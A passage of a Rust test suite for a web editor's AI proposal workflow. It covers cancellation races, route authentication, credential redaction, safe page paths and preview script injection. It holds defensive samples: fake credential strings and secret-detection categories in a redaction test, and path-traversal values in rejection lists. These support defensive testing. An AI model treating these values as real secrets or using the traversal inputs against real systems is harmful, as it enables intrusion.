                .unwrap();
            assert_eq!(
                store.ai_attempts.complete(
                    "prj_generation_filler",
                    &filler_id,
                    filler.generation(),
                    AttemptStatus::ProviderFailed,
                ),
                CompleteResult::Recorded
            );
        }
        assert_eq!(store.ai_attempts.status(project_id, attempt_id), None);
        claim_ai_attempt(&mut store.ai_attempts, project_id, attempt_id)
            .unwrap()
            .generation()
    };
    assert_ne!(stale_generation, current_generation);

    drop(stale_release_guard);
    assert_eq!(
        harness
            .state
            .store()
            .unwrap()
            .ai_attempts
            .status(project_id, attempt_id),
        Some(AttemptStatus::Running)
    );

    let mut stale_complete_guard = ActiveAttemptGuard::new(
        harness.state.clone(),
        project_id,
        attempt_id,
        stale_generation,
    );
    {
        let mut store = harness.state.store().unwrap();
        let error = stale_complete_guard
            .complete(&mut store.ai_attempts, AttemptStatus::ProviderFailed)
            .unwrap_err();
        assert_eq!(error.code, "ai_attempt_not_active");
        assert_eq!(
            store.ai_attempts.status(project_id, attempt_id),
            Some(AttemptStatus::Running)
        );
        assert!(
            store
                .ai_attempts
                .release(project_id, attempt_id, current_generation)
        );
    }
}

#[tokio::test]
async fn semantic_ai_cancel_is_idempotent_and_late_provider_completion_never_promotes() {
    let _workflow_guard = SYNAPSEGIT_WORKFLOW_TEST_LOCK.lock().await;
    let harness = Harness::new().await;
    let project = response_json(
        harness
            .post(
                "/api/v1/projects",
                json!({"schemaVersion":"1","template":"blank"}),
            )
            .await,
    )
    .await;
    let project_id = string_at(&project, "/project/id");
    let revision_id = string_at(&project, "/project/revisionId");
    let target = response_json(
        harness
            .post(
                &format!("/api/v1/projects/{project_id}/targets"),
                element_target_request(&revision_id, 601, "hero-heading"),
            )
            .await,
    )
    .await;
    let cancelled_attempt_id = "attempt-cancel-race-canary";
    let mut first_context_request =
        context_request(&revision_id, &target, "見出しを変更してください。");
    first_context_request["attemptId"] = json!(cancelled_attempt_id);
    let first_context = harness
        .post(
            &format!("/api/v1/projects/{project_id}/contexts"),
            first_context_request,
        )
        .await;
    assert_eq!(first_context.status(), StatusCode::CREATED);
    let first_context = response_json(first_context).await;

    let pending = ai_provider::testing::PendingProvider::install(cancelled_attempt_id).await;
    let proposal_task = tokio::spawn({
        let state = harness.state.clone();
        let token = harness.token.clone();
        let uri = format!("/api/v1/projects/{project_id}/proposals");
        let payload = json!({
            "schemaVersion":"1",
            "contextId":string_at(&first_context, "/context/id"),
            "contextSha256":string_at(&first_context, "/context/sha256")
        });
        async move { post_for(&state, &token, &uri, payload).await }
    });
    pending.wait_until_entered().await;

    let status_uri = format!("/api/v1/projects/{project_id}/ai-attempts/{cancelled_attempt_id}");
    let running = harness.get(&status_uri).await;
    assert_eq!(running.status(), StatusCode::OK);
    assert_eq!(
        response_json(running).await,
        json!({
            "schemaVersion":"1",
            "attemptId":cancelled_attempt_id,
            "status":"running"
        })
    );

    let malformed_cancel_canary = "PRIVATE-CANCEL-DETAIL-CANARY";
    let malformed_cancel = harness
        .post(
            &format!("{status_uri}/cancel"),
            json!({"schemaVersion":"1","reason":malformed_cancel_canary}),
        )
        .await;
    assert_eq!(malformed_cancel.status(), StatusCode::BAD_REQUEST);
    assert!(
        !serde_json::to_string(&response_json(malformed_cancel).await)
            .unwrap()
            .contains(malformed_cancel_canary)
    );

    let cancelled = harness
        .post(
            &format!("{status_uri}/cancel"),
            json!({"schemaVersion":"1"}),
        )
        .await;
    assert_eq!(cancelled.status(), StatusCode::OK);
    let cancelled_body = json!({
        "schemaVersion":"1",
        "attemptId":cancelled_attempt_id,
        "status":"cancelled"
    });
    assert_eq!(response_json(cancelled).await, cancelled_body);

    let replay = harness
        .post(
            &format!("{status_uri}/cancel"),
            json!({"schemaVersion":"1"}),
        )
        .await;
    assert_eq!(replay.status(), StatusCode::OK);
    assert_eq!(response_json(replay).await, cancelled_body);
    assert_eq!(
        response_json(harness.get(&status_uri).await).await,
        cancelled_body
    );

    let cancelled_proposal = tokio::time::timeout(std::time::Duration::from_secs(5), proposal_task)
        .await
        .expect("cancelled proposal request completed")
        .expect("proposal task");
    assert_eq!(cancelled_proposal.status(), StatusCode::CONFLICT);
    assert_eq!(
        response_json(cancelled_proposal).await["error"]["code"],
        "ai_attempt_cancelled"
    );

    pending.release();
    pending.wait_until_completed().await;
    {
        let store = harness.state.store().unwrap();
        assert!(
            store
                .projects
                .get(&project_id)
                .is_some_and(|project| project.proposal.is_none())
        );
        assert_eq!(
            store.ai_attempts.status(&project_id, cancelled_attempt_id),
            Some(AttemptStatus::Cancelled)
        );
    }

    let same_attempt_retry = harness
        .post(
            &format!("/api/v1/projects/{project_id}/proposals"),
            json!({
                "schemaVersion":"1",
                "contextId":string_at(&first_context, "/context/id"),
                "contextSha256":string_at(&first_context, "/context/sha256")
            }),
        )
        .await;
    assert_eq!(same_attempt_retry.status(), StatusCode::CONFLICT);
    assert_eq!(
        response_json(same_attempt_retry).await["error"]["code"],
        "ai_attempt_already_finished"
    );

    let new_attempt_id = "attempt-after-explicit-cancel";
    let mut next_context_request =
        context_request(&revision_id, &target, "見出しを変更してください。");
    next_context_request["attemptId"] = json!(new_attempt_id);
    let next_context = response_json(
        harness
            .post(
                &format!("/api/v1/projects/{project_id}/contexts"),
                next_context_request,
            )
            .await,
    )
    .await;
    let new_proposal = harness
        .post(
            &format!("/api/v1/projects/{project_id}/proposals"),
            json!({
                "schemaVersion":"1",
                "contextId":string_at(&next_context, "/context/id"),
                "contextSha256":string_at(&next_context, "/context/sha256")
            }),
        )
        .await;
    assert_eq!(new_proposal.status(), StatusCode::CREATED);
    let ready_uri = format!("/api/v1/projects/{project_id}/ai-attempts/{new_attempt_id}");
    assert_eq!(
        response_json(harness.get(&ready_uri).await).await,
        json!({
            "schemaVersion":"1",
            "attemptId":new_attempt_id,
            "status":"proposal_ready"
        })
    );
}

#[tokio::test]
async fn dropped_proposal_request_is_not_semantic_cancel_and_same_attempt_can_retry() {
    let _workflow_guard = SYNAPSEGIT_WORKFLOW_TEST_LOCK.lock().await;
    let harness = Harness::new().await;
    let project = response_json(
        harness
            .post(
                "/api/v1/projects",
                json!({"schemaVersion":"1","template":"blank"}),
            )
            .await,
    )
    .await;
    let project_id = string_at(&project, "/project/id");
    let revision_id = string_at(&project, "/project/revisionId");
    let target = response_json(
        harness
            .post(
                &format!("/api/v1/projects/{project_id}/targets"),
                element_target_request(&revision_id, 603, "hero-heading"),
            )
            .await,
    )
    .await;
    let attempt_id = "attempt-http-future-drop";
    let mut context_payload = context_request(&revision_id, &target, "見出しを変更してください。");
    context_payload["attemptId"] = json!(attempt_id);
    let context = response_json(
        harness
            .post(
                &format!("/api/v1/projects/{project_id}/contexts"),
                context_payload,
            )
            .await,
    )
    .await;
    let proposal_payload = json!({
        "schemaVersion":"1",
        "contextId":string_at(&context, "/context/id"),
        "contextSha256":string_at(&context, "/context/sha256")
    });
    let pending = ai_provider::testing::PendingProvider::install(attempt_id).await;
    let proposal_task = tokio::spawn({
        let state = harness.state.clone();
        let token = harness.token.clone();
        let uri = format!("/api/v1/projects/{project_id}/proposals");
        let payload = proposal_payload.clone();
        async move { post_for(&state, &token, &uri, payload).await }
    });
    pending.wait_until_entered().await;
    proposal_task.abort();
    assert!(proposal_task.await.unwrap_err().is_cancelled());
    pending.release();
    pending.wait_until_completed().await;

    let status_uri = format!("/api/v1/projects/{project_id}/ai-attempts/{attempt_id}");
    assert_eq!(
        response_json(harness.get(&status_uri).await).await["status"],
        "queued"
    );
    let retried = harness
        .post(
            &format!("/api/v1/projects/{project_id}/proposals"),
            proposal_payload,
        )
        .await;
    assert_eq!(retried.status(), StatusCode::CREATED);
    assert_eq!(
        response_json(harness.get(&status_uri).await).await["status"],
        "proposal_ready"
    );
}

#[tokio::test]
async fn ai_attempt_routes_require_auth_exact_ids_and_project_binding() {
    let harness = Harness::new().await;
    let first_project = response_json(
        harness
            .post(
                "/api/v1/projects",
                json!({"schemaVersion":"1","template":"blank"}),
            )
            .await,
    )
    .await;
    let second_project = response_json(
        harness
            .post(
                "/api/v1/projects",
                json!({"schemaVersion":"1","template":"blank"}),
            )
            .await,
    )
    .await;
    let first_project_id = string_at(&first_project, "/project/id");
    let second_project_id = string_at(&second_project, "/project/id");
    let attempt_id = "attempt-project-bound";
    {
        let mut store = harness.state.store().unwrap();
        let _ = store
            .ai_attempts
            .claim(&first_project_id, attempt_id)
            .unwrap();
    }
    let status_uri = format!("/api/v1/projects/{first_project_id}/ai-attempts/{attempt_id}");

    let unauthenticated = editor_router(harness.state.clone())
        .oneshot(
            Request::builder()
                .uri(&status_uri)
                .header(HOST, EDITOR_HOST)
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(unauthenticated.status(), StatusCode::UNAUTHORIZED);

    let cross_project = harness
        .get(&format!(
            "/api/v1/projects/{second_project_id}/ai-attempts/{attempt_id}"
        ))
        .await;
    assert_eq!(cross_project.status(), StatusCode::NOT_FOUND);

    let invalid_project_canary = "project~PRIVATE-PATH-CANARY";
    let invalid_project = harness
        .get(&format!(
            "/api/v1/projects/{invalid_project_canary}/ai-attempts/{attempt_id}"
        ))
        .await;
    assert_eq!(invalid_project.status(), StatusCode::BAD_REQUEST);
    assert!(
        !serde_json::to_string(&response_json(invalid_project).await)
            .unwrap()
            .contains(invalid_project_canary)
    );

    let invalid_attempt_canary = "attempt~PRIVATE-PATH-CANARY";
    let invalid_attempt = harness
        .get(&format!(
            "/api/v1/projects/{first_project_id}/ai-attempts/{invalid_attempt_canary}"
        ))
        .await;
    assert_eq!(invalid_attempt.status(), StatusCode::BAD_REQUEST);
    assert!(
        !serde_json::to_string(&response_json(invalid_attempt).await)
            .unwrap()
            .contains(invalid_attempt_canary)
    );

    let wrong_project_cancel = harness
        .post(
            &format!("/api/v1/projects/{second_project_id}/ai-attempts/{attempt_id}/cancel"),
            json!({"schemaVersion":"1"}),
        )
        .await;
    assert_eq!(wrong_project_cancel.status(), StatusCode::NOT_FOUND);
    assert_eq!(
        response_json(harness.get(&status_uri).await).await["status"],
        "running"
    );

    let cancelled = harness
        .post(
            &format!("{status_uri}/cancel"),
            json!({"schemaVersion":"1"}),
        )
        .await;
    assert_eq!(cancelled.status(), StatusCode::OK);
}

#[tokio::test]
async fn cancel_before_provider_claim_tombstones_the_queued_context_attempt() {
    let harness = Harness::new().await;
    let project = response_json(
        harness
            .post(
                "/api/v1/projects",
                json!({"schemaVersion":"1","template":"blank"}),
            )
            .await,
    )
    .await;
    let project_id = string_at(&project, "/project/id");
    let revision_id = string_at(&project, "/project/revisionId");
    let target = response_json(
        harness
            .post(
                &format!("/api/v1/projects/{project_id}/targets"),
                element_target_request(&revision_id, 602, "hero-heading"),
            )
            .await,
    )
    .await;
    let attempt_id = "attempt-cancel-before-claim";
    let mut context_payload = context_request(&revision_id, &target, "見出しを変更してください。");
    context_payload["attemptId"] = json!(attempt_id);
    let context = harness
        .post(
            &format!("/api/v1/projects/{project_id}/contexts"),
            context_payload,
        )
        .await;
    assert_eq!(context.status(), StatusCode::CREATED);
    let context = response_json(context).await;
    let status_uri = format!("/api/v1/projects/{project_id}/ai-attempts/{attempt_id}");
    assert_eq!(
        response_json(harness.get(&status_uri).await).await,
        json!({"schemaVersion":"1","attemptId":attempt_id,"status":"queued"})
    );

    let cancelled = harness
        .post(
            &format!("{status_uri}/cancel"),
            json!({"schemaVersion":"1"}),
        )
        .await;
    assert_eq!(cancelled.status(), StatusCode::OK);
    assert_eq!(response_json(cancelled).await["status"], "cancelled");

    let proposal = harness
        .post(
            &format!("/api/v1/projects/{project_id}/proposals"),
            json!({
                "schemaVersion":"1",
                "contextId":string_at(&context, "/context/id"),
                "contextSha256":string_at(&context, "/context/sha256")
            }),
        )
        .await;
    assert_eq!(proposal.status(), StatusCode::CONFLICT);
    assert_eq!(
        response_json(proposal).await["error"]["code"],
        "ai_attempt_already_finished"
    );
    let store = harness.state.store().unwrap();
    assert!(
        store
            .projects
            .get(&project_id)
            .is_some_and(|project| project.proposal.is_none())
    );
}

#[test]
fn proposal_target_reresolution_is_evidenced_and_fails_closed() {
    let revision_id = "rev_11111111111111111111111111111111";
    let target: TargetRecord = serde_json::from_value(
        element_target_request(revision_id, 1, "hero-heading")["target"].clone(),
    )
    .unwrap();

    let resolved =
        proposal_target_reresolution_check(&target, &blank_files(), revision_id).unwrap();
    assert_eq!(resolved.id, "target-reresolution");
    assert_eq!(resolved.status, StaticCheckStatus::Passed);

    let mut ambiguous_files = blank_files();
    let ambiguous_html = String::from_utf8(ambiguous_files["index.html"].clone())
        .unwrap()
        .replace(
            "</main>",
            "<h1 data-lp-id=\"hero-heading\">duplicate</h1></main>",
        );
    ambiguous_files.insert("index.html".into(), ambiguous_html.into_bytes());
    let ambiguous =
        proposal_target_reresolution_check(&target, &ambiguous_files, revision_id).unwrap_err();
    assert_eq!(ambiguous.status, StatusCode::UNPROCESSABLE_ENTITY);
    assert_eq!(ambiguous.code, "proposal_target_ambiguous");

    let mut detached_files = blank_files();
    let detached_html = String::from_utf8(detached_files["index.html"].clone())
        .unwrap()
        .replace("hero-heading", "removed-heading")
        .replace("まだ、白紙です。", "削除済み");
    detached_files.insert("index.html".into(), detached_html.into_bytes());
    let detached =
        proposal_target_reresolution_check(&target, &detached_files, revision_id).unwrap_err();
    assert_eq!(detached.status, StatusCode::UNPROCESSABLE_ENTITY);
    assert_eq!(detached.code, "proposal_target_detached");

    let comment_spoof_html = String::from_utf8(detached_files["index.html"].clone())
        .unwrap()
        .replace(
            "</body>",
            "<!-- <h1 data-lp-id=\"hero-heading\">まだ、白紙です。</h1> --></body>",
        );
    detached_files.insert("index.html".into(), comment_spoof_html.into_bytes());
    let comment_spoof =
        proposal_target_reresolution_check(&target, &detached_files, revision_id).unwrap_err();
    assert_eq!(comment_spoof.status, StatusCode::UNPROCESSABLE_ENTITY);
    assert_eq!(comment_spoof.code, "proposal_target_ambiguous");

    detached_files.remove("index.html");
    let missing_page =
        proposal_target_reresolution_check(&target, &detached_files, revision_id).unwrap_err();
    assert_eq!(missing_page.code, "proposal_target_detached");
}

#[test]
fn provider_context_redacts_common_credential_forms_case_insensitively() {
    let source = concat!(
        "Authorization: bearer very-secret-token\n",
        "AWS_ACCESS_KEY_ID=AKIA1234567890ABCDEF\n",
        "github_token=ghp_1234567890abcdef\n",
        "const client_secret = \"SK-1234567890abcdef\";\n",
        "path=/Users/alice/private-project\n",
    );

    let (redacted, categories) = redact_sensitive_text(source);

    for secret in [
        "very-secret-token",
        "AKIA1234567890ABCDEF",
        "ghp_1234567890abcdef",
        "SK-1234567890abcdef",
        "/Users/alice/private-project",
    ] {
        assert!(!redacted.contains(secret), "credential leaked: {secret}");
    }
    for category in [
        "absolute_path",
        "aws_access_key",
        "bearer_token",
        "credential_assignment",
        "github_token",
        "openai_key",
    ] {
        assert!(
            categories.iter().any(|value| value == category),
            "missing redaction category: {category}"
        );
    }
}

#[tokio::test]
async fn redacted_site_context_is_reviewable_but_generation_fails_before_provider_execution() {
    let source = tempfile::tempdir().unwrap();
    let secret = "Bearer very-secret-site-token";
    let source_html =
        BLANK_INDEX.replace("<body>", &format!("<body data-private-note=\"{secret}\">"));
    std::fs::write(source.path().join("index.html"), source_html.as_bytes()).unwrap();
    std::fs::write(source.path().join("styles.css"), BLANK_STYLES.as_bytes()).unwrap();
    let harness = Harness::with_import(source).await;

    let preview = response_json(
        harness
            .post("/api/v1/imports/previews", json!({"schemaVersion":"1"}))
            .await,
    )
    .await;
    let confirmed = harness
        .post(
            &format!(
                "/api/v1/imports/{}/confirm",
                string_at(&preview, "/importPreview/id")
            ),
            json!({
                "schemaVersion":"1",
                "expectedManifestSha256":string_at(&preview, "/importPreview/manifestSha256")
            }),
        )
        .await;
    assert_eq!(confirmed.status(), StatusCode::CREATED);
    let confirmed = response_json(confirmed).await;
    let project_id = string_at(&confirmed, "/project/id");
    let revision_id = string_at(&confirmed, "/project/revisionId");
    let target = harness
        .post(
            &format!("/api/v1/projects/{project_id}/targets"),
            element_target_request(&revision_id, 501, "hero-heading"),
        )
        .await;
    assert_eq!(target.status(), StatusCode::CREATED);
    let target = response_json(target).await;
    let context = harness
        .post(
            &format!("/api/v1/projects/{project_id}/contexts"),
            context_request(&revision_id, &target, "見出しを変更してください。"),
        )
        .await;
    assert_eq!(context.status(), StatusCode::CREATED);
    let context = response_json(context).await;
    let canonical_text = context["context"]["canonicalJson"].as_str().unwrap();
    assert!(!canonical_text.contains(secret));
    let canonical: Value = serde_json::from_str(canonical_text).unwrap();
    let entry = &canonical["manifest"]["entries"][0];
    let content = canonical["untrustedSiteContent"][0]["content"]
        .as_str()
        .unwrap();
    let source_sha256 = canonical["untrustedSiteContent"][0]["sourceSha256"]
        .as_str()
        .unwrap();
    let included_sha256 = canonical["untrustedSiteContent"][0]["includedSha256"]
        .as_str()
        .unwrap();
    assert_eq!(source_sha256, raw_sha256(source_html.as_bytes()));
    assert_eq!(included_sha256, raw_sha256(content.as_bytes()));
    assert_ne!(source_sha256, included_sha256);
    assert_eq!(entry["sha256"], included_sha256);
    assert_eq!(entry["redacted"], true);

    let forged = harness
        .post(
            &format!("/api/v1/projects/{project_id}/proposals"),
            json!({
                "schemaVersion":"1",
                "contextId":string_at(&context, "/context/id"),
                "contextSha256":"0".repeat(64)
            }),
        )
        .await;
    assert_eq!(forged.status(), StatusCode::CONFLICT);
    assert_eq!(
        response_json(forged).await["error"]["code"],
        "context_digest_mismatch"
    );

    let proposal = harness
        .post(
            &format!("/api/v1/projects/{project_id}/proposals"),
            json!({
                "schemaVersion":"1",
                "contextId":string_at(&context, "/context/id"),
                "contextSha256":string_at(&context, "/context/sha256")
            }),
        )
        .await;
    assert_eq!(proposal.status(), StatusCode::UNPROCESSABLE_ENTITY);
    let proposal = response_json(proposal).await;
    assert_eq!(
        proposal["error"]["code"],
        "provider_context_redacted_source_unsupported"
    );
    assert!(!serde_json::to_string(&proposal).unwrap().contains(secret));
    let store = harness.state.store().unwrap();
    assert!(!store.ai_attempts.contains_project(&project_id));
    assert!(
        store
            .projects
            .get(&project_id)
            .is_some_and(|project| project.proposal.is_none())
    );
}

#[tokio::test]
async fn redacted_instruction_with_clean_site_files_can_generate_a_proposal() {
    let _workflow_guard = SYNAPSEGIT_WORKFLOW_TEST_LOCK.lock().await;
    let harness = Harness::new().await;
    let project = response_json(
        harness
            .post(
                "/api/v1/projects",
                json!({"schemaVersion":"1","template":"blank"}),
            )
            .await,
    )
    .await;
    let project_id = string_at(&project, "/project/id");
    let revision_id = string_at(&project, "/project/revisionId");
    let target = response_json(
        harness
            .post(
                &format!("/api/v1/projects/{project_id}/targets"),
                element_target_request(&revision_id, 502, "hero-heading"),
            )
            .await,
    )
    .await;
    let secret = "Bearer very-secret-instruction-token";
    let context = harness
        .post(
            &format!("/api/v1/projects/{project_id}/contexts"),
            context_request(
                &revision_id,
                &target,
                &format!("Authorization: {secret}\n見出しを変更してください。"),
            ),
        )
        .await;
    assert_eq!(context.status(), StatusCode::CREATED);
    let context = response_json(context).await;
    let canonical_text = context["context"]["canonicalJson"].as_str().unwrap();
    assert!(!canonical_text.contains(secret));
    let canonical: Value = serde_json::from_str(canonical_text).unwrap();
    assert!(
        canonical["manifest"]["entries"]
            .as_array()
            .is_some_and(|entries| entries.iter().all(|entry| entry["redacted"] == false))
    );
    assert!(
        canonical["instructionRedactions"]
            .as_array()
            .is_some_and(|redactions| !redactions.is_empty())
    );

    let proposal = harness
        .post(
            &format!("/api/v1/projects/{project_id}/proposals"),
            json!({
                "schemaVersion":"1",
                "contextId":string_at(&context, "/context/id"),
                "contextSha256":string_at(&context, "/context/sha256")
            }),
        )
        .await;
    assert_eq!(proposal.status(), StatusCode::CREATED);
    let proposal = response_json(proposal).await;
    assert_eq!(proposal["proposal"]["attribution"]["providerId"], "fake");
    assert!(!serde_json::to_string(&proposal).unwrap().contains(secret));
}

#[test]
fn target_page_path_matches_contract_safety_and_utf8_boundaries() {
    let ascii_boundary = format!("{}.html", "a".repeat(STORAGE_MAX_PATH_BYTES - 5));
    let multibyte_boundary = format!("{}.html", "界".repeat(169));
    assert_eq!(ascii_boundary.len(), STORAGE_MAX_PATH_BYTES);
    assert_eq!(multibyte_boundary.len(), STORAGE_MAX_PATH_BYTES);
    for accepted in [
        "index.html",
        "INDEX.HTML",
        "pages/Café/ランディング.HtM",
        "docs/a#b.html",
        &ascii_boundary,
        &multibyte_boundary,
    ] {
        assert!(is_safe_page_path(accepted), "{accepted}");
        assert_eq!(
            mime_guess::from_path(accepted)
                .first_or_octet_stream()
                .essence_str(),
            "text/html",
            "{accepted}",
        );
    }

    let over_ascii_boundary = format!("{}.html", "a".repeat(STORAGE_MAX_PATH_BYTES - 4));
    let over_multibyte_boundary = format!("{}.html", "界".repeat(170));
    for rejected in [
        "",
        "/",
        "/index.html",
        "C:/index.html",
        "pages/",
        "pages//index.html",
        "pages/./index.html",
        "pages/../index.html",
        "index.html?draft=1",
        "pages\\index.html",
        "bad./index.html",
        "con/index.html",
        "C:index.html",
        "pages/line\nbreak.html",
        ".html",
        "docs/.html",
        "index.css",
        "pages/Cafe\u{301}.HTML",
        &over_ascii_boundary,
        &over_multibyte_boundary,
    ] {
        assert!(!is_safe_page_path(rejected), "{rejected}");
    }
}

#[test]
fn preview_directory_route_resolves_only_one_safe_trailing_slash() {
    assert_eq!(
        canonical_preview_file_path("docs/"),
        Some("docs/index.html".into())
    );
    assert_eq!(
        canonical_preview_file_path("docs/guide.html"),
        Some("docs/guide.html".into())
    );
    for rejected in [
        "",
        "/",
        "/docs/",
        "docs//",
        "docs///",
        "docs/./",
        "docs/../",
        "../docs/",
        "docs\\",
        "docs\\index.html",
    ] {
        assert_eq!(canonical_preview_file_path(rejected), None, "{rejected}");
    }
    let oversized_directory = format!("{}/", "a".repeat(STORAGE_MAX_PATH_BYTES - 1));
    assert_eq!(canonical_preview_file_path(&oversized_directory), None);
}

#[test]
fn preview_bridge_is_response_only_first_script_and_privacy_safe_before_handshake() {
    let source = br#"<!doctype html><!-- <script src="comment.js"></script><header> --><html><head><meta charset="utf-8"><script src="app.js"></script></head><body><header>source</header></body></html>"#;
    let original = source.to_vec();
    let injected = inject_preview_bridge(
        source,
        "fixed-nonce",
        EDITOR_ORIGIN,
        "prj_fixed",
        "pro_fixed",
        "rev_fixed",
        "docs/index.html",
    )
    .unwrap();
    assert_eq!(
        source,
        original.as_slice(),
        "injection must not mutate source"
    );
    let injected = String::from_utf8(injected).unwrap();
    let bridge = injected.find("<script nonce=\"fixed-nonce\">").unwrap();
    let source_script = injected.find("<script src=\"app.js\">").unwrap();
    let head = injected.find("<head>").unwrap();
    assert_eq!(bridge, "<!doctype html>".len());
    assert!(bridge < head);
    assert!(
        bridge < source_script,
        "bridge listeners must be installed first"
    );
    assert!(injected.contains("window.name=\"\""));
    assert!(injected.contains("seen=new Set(),pending=[]"));
    assert!(injected.contains("channel?send(code):pending.push(code)"));
    assert!(injected.contains("pending.splice(0).forEach(send)"));
    assert!(injected.contains("securitypolicyviolation"));
    assert!(injected.contains("addEventListener(\"error\",()=>diagnose(\"site_error\"),true)"));
    assert!(injected.contains("nav.addEventListener(\"navigate\""));
    assert!(injected.contains("Function.call.bind(String.prototype.startsWith)"));
    assert!(injected.contains("Function.call.bind(Event.prototype.preventDefault)"));
    assert!(injected.contains("getter(NavigateEvent.prototype,\"destination\")"));
    assert!(injected.contains("getter(NavigationDestination.prototype,\"url\")"));
    assert!(injected.contains("startsWith(destination,A)"));
    assert!(!injected.contains("new URL("));
    assert!(injected.contains("Object.defineProperty(owner,name"));
    assert!(injected.contains("RTCPeerConnection"));
    assert!(injected.contains("function previewTargetRuntime"));
    assert!(injected.contains("const maximumScannedElements = 10_000"));
    assert!(injected.contains("createTreeWalker(root, NodeFilter.SHOW_ELEMENT)"));
    assert!(injected.contains("visited < maximumScannedElements"));
    assert!(injected.contains("boundedMatches(blockSelector, 512)"));
    assert!(injected.contains("scheduleRegionOverlay"));
    assert!(injected.contains("requestFrame(() =>"));
    assert!(injected.contains("addEventListener(\"scroll\", scheduleRememberedOverlay"));
    assert!(injected.contains("new ResizeObserver"));
    assert!(injected.contains("new MutationObserver"));
    assert!(!injected.contains("document.querySelectorAll(blockSelector)"));
    assert!(!injected.contains("document.querySelectorAll(\"h1,h2,h3,p,a,button,img\")"));
    assert!(injected.contains(",\"docs/index.html\");</script>"));
    assert!(
        injected.contains("\n}))(") && !injected.contains("\n});)("),
        "the extracted target runtime must remain a callable expression"
    );
    assert!(injected.contains("sourceUnavailable:true"));
    for private_field in [
        "error.message",
        "error.filename",
        "error.stack",
        "reason.stack",
    ] {
        assert!(!injected.contains(private_field));
    }

    let no_doctype =
        br#"<template><script src="template.js"></script></template><noscript><script src="fallback.js"></script></noscript>"#;
    let injected_no_doctype = inject_preview_bridge(
        no_doctype,
        "second-nonce",
        EDITOR_ORIGIN,
        "prj_fixed",
        "rev_fixed",
        "rev_fixed",
        "index.html",
    )
    .unwrap();
    assert!(injected_no_doctype.starts_with(b"<script nonce=\"second-nonce\">"));
    assert_eq!(
        preview_bridge_insertion("\u{feff} \n<!DOCTYPE html><html>"),
        20
    );
}

#[test]
fn preview_scope_and_length_delimited_labels_are_canonical() {
    assert_eq!(
        validate_preview_scope_origin("http://localhost:4322").unwrap(),
        4322
    );
    for invalid in [
        "http://127.0.0.1:4322",
        "https://localhost:4322",
        "http://localhost:04322",
        "http://localhost:0",
        "http://localhost:80",
        "http://localhost:4322/",
        "http://user@localhost:4322",
        "http://localhost:4322?query=1",
        "http://localhost:4322#fragment",
    ] {
        assert!(
            validate_preview_scope_origin(invalid).is_err(),
            "accepted non-canonical scope: {invalid}"
        );
    }

    let root = tempfile::tempdir().unwrap();
    let state = StudioState::new(ServerConfig::new(
        EDITOR_ORIGIN,
        EDITOR_HOST,
        PREVIEW_ORIGIN,
        root.path(),
        root.path().join("missing-web-dist"),
    ))
    .unwrap();
    let split_one = scoped_preview_label(&state, "ses_ab", "c", "snapshot");
    let split_two = scoped_preview_label(&state, "ses_a", "bc", "snapshot");
    assert_ne!(
        split_one, split_two,
        "field boundaries must affect the digest"
    );
    assert_eq!(
        split_one,
        scoped_preview_label(&state, "ses_ab", "c", "snapshot")
    );
}

#[test]
fn zip_is_pure_lexical_stored_and_has_fixed_metadata() {
    let files = blank_files();
    let first = deterministic_zip(&files).unwrap();
    let second = deterministic_zip(&files).unwrap();
    assert_eq!(first, second);
    assert_eq!(&first[0..4], &[0x50, 0x4b, 0x03, 0x04]);
    assert_eq!(u16::from_le_bytes([first[8], first[9]]), 0);
    assert_eq!(u16::from_le_bytes([first[10], first[11]]), 0);
    assert_eq!(u16::from_le_bytes([first[12], first[13]]), 0x21);
    let mut archive = zip::ZipArchive::new(Cursor::new(first)).unwrap();
    assert_eq!(archive.by_index(0).unwrap().name(), "index.html");
    assert_eq!(archive.by_index(1).unwrap().name(), "styles.css");
    assert_eq!(archive.by_index(0).unwrap().unix_mode(), Some(0o100644));
    assert_eq!(archive.by_index(1).unwrap().unix_mode(), Some(0o100644));
}

fn sample_binding() -> ApprovalBinding {
    ApprovalBinding {
        session_id: "ses_one".into(),
        project_id: "prj_one".into(),
        review_id: "revw_one".into(),
        proposal_id: "pro_one".into(),
        proposal_digest: "ab".repeat(32),
        expected_revision_id: "rev_one".into(),
        disposition: DispositionDto::AdoptedUnchanged,
        intent_id: "intent_one".into(),
    }
}

async fn response_json(response: Response) -> Value {
    serde_json::from_slice(&response_bytes(response).await).expect("JSON response")
}

async fn response_text(response: Response) -> String {
    String::from_utf8(response_bytes(response).await).expect("UTF-8 response")
}

async fn response_bytes(response: Response) -> Vec<u8> {
    to_bytes(response.into_body(), 16 * 1024 * 1024)
        .await
        .expect("response body")
        .to_vec()
}

async fn assert_uniform_preview_not_found(response: Response) {
    assert_eq!(response.status(), StatusCode::NOT_FOUND);
    assert_eq!(
        response.headers().get(CONTENT_TYPE).unwrap(),
        "text/plain; charset=utf-8"
    );
    assert_eq!(response.headers().get(CACHE_CONTROL).unwrap(), "no-store");
    assert_eq!(
        response.headers().get("clear-site-data").unwrap(),
        "\"cache\", \"cookies\", \"storage\""
    );
    assert_eq!(
        response.headers().get("x-content-type-options").unwrap(),
        "nosniff"
    );
    assert_eq!(
        response.headers().get("referrer-policy").unwrap(),
        "no-referrer"
    );
    assert_eq!(
        response.headers().get("x-dns-prefetch-control").unwrap(),
        "off"
    );
    assert!(response.headers().contains_key("permissions-policy"));
    assert_eq!(
        response.headers().get("content-security-policy").unwrap(),
        PREVIEW_NON_HTML_CSP
    );
    assert_eq!(response_bytes(response).await, b"Not found");
}

fn string_at(value: &Value, pointer: &str) -> String {
    value
        .pointer(pointer)
        .and_then(Value::as_str)
        .unwrap_or_else(|| panic!("missing string at {pointer}: {value}"))
        .to_owned()
}

fn preview_host(url: &str) -> &str {
    url.strip_prefix("http://")
        .and_then(|remainder| remainder.split_once('/'))
        .map(|(host, _)| host)
        .unwrap_or_else(|| panic!("invalid preview URL: {url}"))
}

fn preview_path(url: &str) -> &str {
    url.find("/preview/")
        .map(|index| &url[index..])
        .unwrap_or_else(|| panic!("invalid preview URL: {url}"))
}

fn source_fingerprint(root: &std::path::Path) -> BTreeMap<String, Vec<u8>> {
    fn visit(
        root: &std::path::Path,
        directory: &std::path::Path,
        output: &mut BTreeMap<String, Vec<u8>>,
    ) {
        let mut entries = std::fs::read_dir(directory)
            .unwrap()
            .collect::<Result<Vec<_>, _>>()
            .unwrap();
        entries.sort_by_key(|entry| entry.file_name());
        for entry in entries {
            if entry.file_type().unwrap().is_dir() {
                visit(root, &entry.path(), output);
            } else {
                let path = entry
                    .path()
                    .strip_prefix(root)
                    .unwrap()
                    .to_string_lossy()
